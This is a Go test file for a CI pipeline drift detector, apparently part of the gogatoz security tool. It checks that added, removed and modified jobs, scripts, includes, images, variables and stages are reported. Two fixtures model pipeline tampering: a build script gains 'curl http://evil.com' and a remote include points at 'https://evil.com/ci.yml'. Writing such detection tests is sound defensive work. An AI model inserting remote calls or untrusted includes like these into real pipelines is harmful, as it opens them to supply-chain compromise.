package drift

import (
	"testing"

	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
)

func TestDiff_AddedJob(t *testing.T) {
	baseline := &pipeline.Document{
		Jobs: []pipeline.Job{{Name: "build", Stage: "build", Script: []string{"make build"}}},
	}
	current := &pipeline.Document{
		Jobs: []pipeline.Job{
			{Name: "build", Stage: "build", Script: []string{"make build"}},
			{Name: "deploy", Stage: "deploy", Script: []string{"deploy.sh"}},
		},
	}
	report := Diff(baseline, current)
	found := false
	for _, c := range report.Changes {
		if c.Type == ChangeAdded && c.Category == CategoryJob && c.Name == "deploy" {
			found = true
		}
	}
	if !found {
		t.Error("expected added job 'deploy' in changes")
	}
}

func TestDiff_RemovedJob(t *testing.T) {
	baseline := &pipeline.Document{
		Jobs: []pipeline.Job{
			{Name: "build", Stage: "build", Script: []string{"make build"}},
			{Name: "sast", Stage: "test", Script: []string{"sast-scan"}},
		},
	}
	current := &pipeline.Document{
		Jobs: []pipeline.Job{
			{Name: "build", Stage: "build", Script: []string{"make build"}},
		},
	}
	report := Diff(baseline, current)
	found := false
	for _, c := range report.Changes {
		if c.Type == ChangeRemoved && c.Category == CategoryJob && c.Name == "sast" {
			found = true
		}
	}
	if !found {
		t.Error("expected removed job 'sast' in changes")
	}
}

func TestDiff_ModifiedScript(t *testing.T) {
	baseline := &pipeline.Document{
		Jobs: []pipeline.Job{{Name: "build", Script: []string{"make build"}}},
	}
	current := &pipeline.Document{
		Jobs: []pipeline.Job{{Name: "build", Script: []string{"make build", "curl http://evil.com"}}},
	}
	report := Diff(baseline, current)
	found := false
	for _, c := range report.Changes {
		if c.Type == ChangeModified && c.Category == CategoryScript && c.Name == "build" {
			found = true
		}
	}
	if !found {
		t.Error("expected modified script for job 'build'")
	}
}

func TestDiff_AddedInclude(t *testing.T) {
	baseline := &pipeline.Document{
		Includes: []pipeline.Include{},
	}
	current := &pipeline.Document{
		Includes: []pipeline.Include{{Remote: "https://evil.com/ci.yml"}},
	}
	report := Diff(baseline, current)
	found := false
	for _, c := range report.Changes {
		if c.Type == ChangeAdded && c.Category == CategoryInclude {
			found = true
		}
	}
	if !found {
		t.Error("expected added include in changes")
	}
}

func TestDiff_NoChanges(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{Name: "build", Script: []string{"make build"}}},
	}
	report := Diff(doc, doc)
	if len(report.Changes) != 0 {
		t.Errorf("expected 0 changes, got %d", len(report.Changes))
	}
}

func TestDiff_NilDocuments(t *testing.T) {
	report := Diff(nil, nil)
	if len(report.Changes) != 0 {
		t.Errorf("expected 0 changes for nil docs, got %d", len(report.Changes))
	}
}

func TestDiff_ModifiedImage(t *testing.T) {
	baseline := &pipeline.Document{
		Jobs: []pipeline.Job{{Name: "build", Image: "golang:1.21"}},
	}
	current := &pipeline.Document{
		Jobs: []pipeline.Job{{Name: "build", Image: "golang:1.22"}},
	}
	report := Diff(baseline, current)
	found := false
	for _, c := range report.Changes {
		if c.Type == ChangeModified && c.Category == CategoryJob && c.Name == "build" {
			found = true
		}
	}
	if !found {
		t.Error("expected modified image change for job 'build'")
	}
}

func TestDiff_AddedVariable(t *testing.T) {
	baseline := &pipeline.Document{
		Variables: map[string]any{"EXISTING": "val"},
	}
	current := &pipeline.Document{
		Variables: map[string]any{"EXISTING": "val", "NEW_VAR": "new"},
	}
	report := Diff(baseline, current)
	found := false
	for _, c := range report.Changes {
		if c.Type == ChangeAdded && c.Category == CategoryVariable && c.Name == "NEW_VAR" {
			found = true
		}
	}
	if !found {
		t.Error("expected added variable 'NEW_VAR'")
	}
}

func TestDiff_AddedStage(t *testing.T) {
	baseline := &pipeline.Document{
		Stages: []string{"build", "test"},
	}
	current := &pipeline.Document{
		Stages: []string{"build", "test", "deploy"},
	}
	report := Diff(baseline, current)
	found := false
	for _, c := range report.Changes {
		if c.Type == ChangeAdded && c.Category == CategoryStage && c.Name == "deploy" {
			found = true
		}
	}
	if !found {
		t.Error("expected added stage 'deploy'")
	}
}
